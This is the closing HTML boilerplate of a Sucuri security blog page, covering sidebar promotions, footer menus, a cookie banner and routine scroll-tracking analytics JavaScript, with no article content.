<section id="text-27" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/guides/how-to-clean-a-hacked-website?utm_source=Blog&#038;utm_medium=WidgetLogic&#038;utm_campaign=Guide&#038;utm_term=EN&#038;utm_content=Hacked-Website" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23349 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_guides_website-hack.png" alt="How to Clean a Hacked Website Guide" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-7" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/webinars/how-to-clean-hacked-magento-site?utm_source=Blog&#038;utm_medium=WidgetLogic&#038;utm_campaign=Webinar&#038;utm_term=EN&#038;utm_content=Hacked-Magento" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23483 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_webinars_hacked-magento-1.png" alt="" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-37" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"></div>
		</div></section>
</div><div class="sidebar-cta-widget" id="sidebar-cta"><section id="text-6" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Join Over 20,000 Subscribers!</h3>
			<div class="textwidget"><p><a href="http://sucuri.hs-sites.com/subscribe-to-security" onClick="ga('send', 'event', 'Blog', 'Button_Click', 'Subscribe_to_Security_Newsletter');"><img src="https://blog.sucuri.net/wp-content/uploads/2017/09/17-EN-sucuri-blog-newsletter-banner.png" /></a></p>
</div>
		</div></section>
</div></aside></div></div></div><footer class="site-footer" itemscope itemtype="https://schema.org/WPFooter"><div class="footer-widgets" id="genesis-footer-widgets"><h2 class="genesis-sidebar-title screen-reader-text">Footer</h2><div class="wrap"><div class="widget-area footer-widgets-1 footer-widget-area"><section id="nav_menu-3" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Products</h3>
<div class="menu-footer-products-menu-container"><ul id="menu-footer-products-menu" class="menu"><li id="menu-item-15501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15501"><a href="https://sucuri.net/website-firewall/" itemprop="url">Website Firewall</a></li>
<li id="menu-item-15502" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15502"><a href="https://sucuri.net/website-antivirus/" itemprop="url">Website AntiVirus</a></li>
<li id="menu-item-15503" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15503"><a href="https://sucuri.net/website-backups/" itemprop="url">Website Backups</a></li>
<li id="menu-item-15504" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15504"><a href="https://sucuri.net/wordpress-security/" itemprop="url">WordPress Security</a></li>
<li id="menu-item-15505" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15505"><a href="https://sucuri.net/custom/enterprise/" itemprop="url">Enterprise Services</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-2 footer-widget-area"><section id="nav_menu-4" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Solutions</h3>
<div class="menu-footer-solutions-menu-container"><ul id="menu-footer-solutions-menu" class="menu"><li id="menu-item-15506" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15506"><a href="https://sucuri.net/website-firewall/ddos-protection" itemprop="url">DDos Protection</a></li>
<li id="menu-item-15507" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15507"><a href="https://sucuri.net/website-antivirus/malware-scanning-and-detection" itemprop="url">Malware Detection</a></li>
<li id="menu-item-15508" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15508"><a href="https://sucuri.net/website-antivirus/malware-removal" itemprop="url">Malware Removal</a></li>
<li id="menu-item-15510" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15510"><a href="https://sucuri.net/website-firewall/stop-website-attacks-and-hacks" itemprop="url">Malware Prevention</a></li>
<li id="menu-item-15511" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15511"><a href="https://sucuri.net/website-antivirus/blacklist-removal-and-repair" itemprop="url">Blacklist Removal</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-3 footer-widget-area"><section id="nav_menu-6" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Support</h3>
<div class="menu-footer-support-menu-container"><ul id="menu-footer-support-menu" class="menu"><li id="menu-item-15512" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15512"><a href="https://blog.sucuri.net/" itemprop="url">Blog</a></li>
<li id="menu-item-15513" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15513"><a href="https://kb.sucuri.net/" itemprop="url">Knowledge Base</a></li>
<li id="menu-item-15515" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15515"><a href="https://sitecheck.sucuri.net/" itemprop="url">SiteCheck</a></li>
<li id="menu-item-15516" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15516"><a href="http://labs.sucuri.net/" itemprop="url">Research Labs</a></li>
<li id="menu-item-15517" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15517"><a href="https://sucuri.net/faq/" itemprop="url">FAQ</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-4 footer-widget-area"><section id="nav_menu-5" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Company</h3>
<div class="menu-footer-company-menu-container"><ul id="menu-footer-company-menu" class="menu"><li id="menu-item-15495" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15495"><a href="https://sucuri.net/company/" itemprop="url">About</a></li>
<li id="menu-item-15496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15496"><a href="https://sucuri.net/company/media" itemprop="url">Media</a></li>
<li id="menu-item-15497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15497"><a href="https://sucuri.net/company/events" itemprop="url">Events</a></li>
<li id="menu-item-15498" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15498"><a href="https://sucuri.net/company/employment/" itemprop="url">Employment</a></li>
<li id="menu-item-15499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15499"><a href="https://sucuri.net/company/contact-us" itemprop="url">Contact</a></li>
<li id="menu-item-15500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15500"><a href="https://sucuri.net/customers/" itemprop="url">Testimonials</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-5 footer-widget-area"><section id="text-4" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><ul class="social-icons">
<li><a href="https://www.facebook.com/SucuriSecurity"><span class="screen-reader-text">Facebook</span></a></li>
<li><a href="https://twitter.com/sucurisecurity"><span class="screen-reader-text">Twitter</span></a></li>
<li><a href="https://www.linkedin.com/company/sucuri-security"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a href="https://www.instagram.com/sucurisecurity/"><span class="screen-reader-text">Instagram</span></a></li>
</ul>
<p><a class="button" href="https://dashboard.sucuri.net/login/">Customer Login</a></p>
<p><a class="footer-logo" href="https://sucuri.net/">Sucuri Home</a></p>
</div>
		</div></section>
</div></div></div><div class="site-footer-widget"><div class="wrap"><section id="text-8" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><div class="site-footer-links">
<ul>
<li><a href="https://sucuri.net/terms">Terms of Use</a></li>
<li><a href="https://sucuri.net/privacy">Privacy Policy</a></li>
<li><a href="https://sucuri.net/faq/">Frequently Asked Questions</a></li>
</ul>
</div>
<div class="site-footer-copyright">
<p>&#x000A9;&nbsp;2022 Sucuri Inc. All rights reserved</p>
</div>
</div>
		</div></section>
</div></div></footer></div><script type="text/javascript">
ire('identify', {customerId: '​​', customerEmail: '​​'}); </script><div id="cookie-policy-banner" class="container-fluid cookie-policy-banner hide p-0">
        <div class="container">
            <button id="cookie-policy-decline-btn" class="cb-close cb-decline-anchor">X</button>
            <div class="row">
                <div class="c-lg-8">
                    <p class="mb-0 mt-0 highlight green heavy">Sucuri Cookie Policy <br> <a href="https://sucuri.net/cookies" target="_blank" class="bolder no-underline">See our policy>></a></p>
                    <p class="mb-0 mt-0">Our website uses cookies, which help us to improve our site and enables us to deliver the best possible service and customer experience.</p>
                </div>
                <div class="c-lg-4 d-flex justify-items-start mt-15 align-items-center">
                    <button id="cookie-policy-btn" class="btn btn-primary ml-0">Accept</button>
                    <button class="btn cb-decline-anchor auto-track" data-gatrack="Cookie_Click, Decline">Decline</button>
                    <button id="manage-privacy-options" class="btn">Manage Options</button>
                </div>
            </div>
        </div>
    </div><script type="text/javascript">
		/* MonsterInsights Scroll Tracking */
			if ( typeof(jQuery) !== 'undefined' ) {
				jQuery( document ).ready(function(){
					function monsterinsights_scroll_tracking_load() {
						if ( typeof(__gaTracker) !== 'undefined' && __gaTracker && __gaTracker.hasOwnProperty( "loaded" ) && __gaTracker.loaded == true ) {
							(function(factory) {
								factory(jQuery);
							}(function($) {

								/* Scroll Depth */
								"use strict";
								var defaults = {
									percentage: true
								};

								var $window = $(window),
									cache = [],
									scrollEventBound = false,
									lastPixelDepth = 0;

								/*
								 * Plugin
								 */

								$.scrollDepth = function(options) {

									var startTime = +new Date();

									options = $.extend({}, defaults, options);

									/*
									 * Functions
									 */

									function sendEvent(action, label, scrollDistance, timing) {

										var fieldsArray = {
											hitType       : 'event',
											eventCategory : 'Scroll Depth',
											eventAction   : action,
											eventLabel    : label,
											eventValue    : 1,
											nonInteraction: 1
										};

										if ( 'undefined' === typeof MonsterInsightsObject || 'undefined' === typeof MonsterInsightsObject.sendEvent ) {
											return;
										}

										MonsterInsightsObject.sendEvent( fieldsArray );
										if (arguments.length > 3) {
											fieldsArray = {
												hitType        : 'timing',
												timingCategory : 'Scroll Depth',
												timingVar      : action,
												timingValue    : timing,
												timingLabel    : label,
												nonInteraction: 1
											};
											MonsterInsightsObject.sendEvent( fieldsArray );
										}
									}

									function calculateMarks(docHeight) {
										return {
											'25%' : parseInt(docHeight * 0.25, 10),
											'50%' : parseInt(docHeight * 0.50, 10),
											'75%' : parseInt(docHeight * 0.75, 10),
											/* Cushion to trigger 100% event in iOS */
											'100%': docHeight - 5
										};
									}

									function checkMarks(marks, scrollDistance, timing) {
										/* Check each active mark */
										$.each(marks, function(key, val) {
											if ( $.inArray(key, cache) === -1 && scrollDistance >= val ) {
												sendEvent('Percentage', key, scrollDistance, timing);
												cache.push(key);
											}
										});
									}

									function rounded(scrollDistance) {
										/* Returns String */
										return (Math.floor(scrollDistance/250) * 250).toString();
									}

									function init() {
										bindScrollDepth();
									}

									/*
									 * Public Methods
									 */

									/* Reset Scroll Depth with the originally initialized options */
									$.scrollDepth.reset = function() {
										cache = [];
										lastPixelDepth = 0;
										$window.off('scroll.scrollDepth');
										bindScrollDepth();
									};

									/* Add DOM elements to be tracked */
									$.scrollDepth.addElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.merge(options.elements, elems);

										/* If scroll event has been unbound from window, rebind */
										if (!scrollEventBound) {
											bindScrollDepth();
										}

									};

									/* Remove DOM elements currently tracked */
									$.scrollDepth.removeElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.each(elems, function(index, elem) {

											var inElementsArray = $.inArray(elem, options.elements);
											var inCacheArray = $.inArray(elem, cache);

											if (inElementsArray != -1) {
												options.elements.splice(inElementsArray, 1);
											}

											if (inCacheArray != -1) {
												cache.splice(inCacheArray, 1);
											}

										});

									};

									/*
									 * Throttle function borrowed from:
									 * Underscore.js 1.5.2
									 * http://underscorejs.org
									 * (c) 2009-2013 Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
									 * Underscore may be freely distributed under the MIT license.
									 */

									function throttle(func, wait) {
										var context, args, result;
										var timeout = null;
										var previous = 0;
										var later = function() {
											previous = new Date;
											timeout = null;
											result = func.apply(context, args);
										};
										return function() {
											var now = new Date;
											if (!previous) previous = now;
											var remaining = wait - (now - previous);
											context = this;
											args = arguments;
											if (remaining <= 0) {
												clearTimeout(timeout);
												timeout = null;
												previous = now;
												result = func.apply(context, args);
											} else if (!timeout) {
												timeout = setTimeout(later, remaining);
											}
											return result;
										};
									}

									/*
									 * Scroll Event
									 */

									function bindScrollDepth() {

										scrollEventBound = true;

										$window.on('scroll.scrollDepth', throttle(function() {
											/*
											 * We calculate document and window height on each scroll event to
											 * account for dynamic DOM changes.
											 */

											var docHeight = $(document).height(),
												winHeight = window.innerHeight ? window.innerHeight : $window.height(),
												scrollDistance = $window.scrollTop() + winHeight,

												/* Recalculate percentage marks */
												marks = calculateMarks(docHeight),

												/* Timing */
												timing = +new Date - startTime;

											checkMarks(marks, scrollDistance, timing);
										}, 500));

									}

									init();
								};

								/* UMD export */
								return $.scrollDepth;

							}));

							jQuery.scrollDepth();
						} else {
							setTimeout(monsterinsights_scroll_tracking_load, 200);
						}
					}
					monsterinsights_scroll_tracking_load();
				});
			}
		/* End MonsterInsights Scroll Tracking */
		
</script><script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/hoverIntent.min.js?ver=1.10.2' id='hoverIntent-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.min.js?ver=1.7.5' id='superfish-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.args.min.js?ver=2.7.1' id='superfish-args-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/skip-links.min.js?ver=2.7.1' id='skip-links-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/theme.js?ver=1.1.0' id='sucuriblog-theme-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky.js?ver=1.0.4' id='sucuriblog-sticky-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky-init.js?ver=1.0.1' id='sucuriblog-sticky-js-init-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/cookie-banner.js?ver=20200914' id='cookie-banner-js-js'></script>
</body></html>
